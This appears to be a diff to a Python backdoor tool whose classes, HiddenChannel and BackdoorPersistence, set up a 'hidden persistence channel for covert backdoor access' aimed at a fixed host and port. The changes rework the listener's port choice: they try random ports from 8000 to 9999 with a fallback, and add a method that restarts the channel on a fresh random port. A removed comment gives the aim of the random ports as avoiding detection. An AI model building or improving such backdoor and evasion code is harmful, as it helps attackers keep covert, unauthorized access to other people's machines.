@@ -13,8 +13,8 @@ class HiddenChannel:
     """Hidden persistence channel for covert backdoor access"""
 
     def __init__(self, listen_port=None, target_host='192.168.56.104', target_port=5555):
-        # Use random port if not specified to avoid detection
-        self.listen_port = listen_port or random.randint(8000, 9999)
+        # Port will be set during initialization to ensure availability
+        self.listen_port = listen_port  # Don't generate random port yet
         self.target_host = target_host
         self.target_port = target_port
         self.is_running = False
@@ -325,11 +325,21 @@ class BackdoorPersistence:
         
         # Find available port if none specified
         if listen_port is None:
-            available_port = self.persistence_mgr.find_available_port()
-            if available_port:
-                self.channel.listen_port = available_port
+            # Try random ports until we find an available one
+            max_attempts = 10
+            for attempt in range(max_attempts):
+                random_port = random.randint(8000, 9999)
+                in_use, port_msg = self.persistence_mgr.check_port_usage(random_port)
+                if in_use == False:  # Port is available
+                    self.channel.listen_port = random_port
+                    break
             else:
-                return False, "No available ports found"
+                # If no random port found, use find_available_port as fallback
+                available_port = self.persistence_mgr.find_available_port()
+                if available_port:
+                    self.channel.listen_port = available_port
+                else:
+                    return False, "No available ports found"
         
         return True, f"Persistence initialized on port {self.channel.listen_port}"
     
@@ -342,6 +352,19 @@ class BackdoorPersistence:
         
         # Start the persistence channel
         return self.channel.start_persistence_channel()
+    
+    def reinitialize_with_new_port(self):
+        """Reinitialize persistence with a new random port"""
+        # Stop current operations if running
+        if self.channel and self.channel.is_running:
+            self.stop_persistence_operations()
+        
+        # Clear current channel
+        self.channel = None
+        self.persistence_mgr = None
+        
+        # Initialize with new random port
+        return self.initialize_persistence()
     
     def stop_persistence_operations(self):
         """Stop persistence operations"""
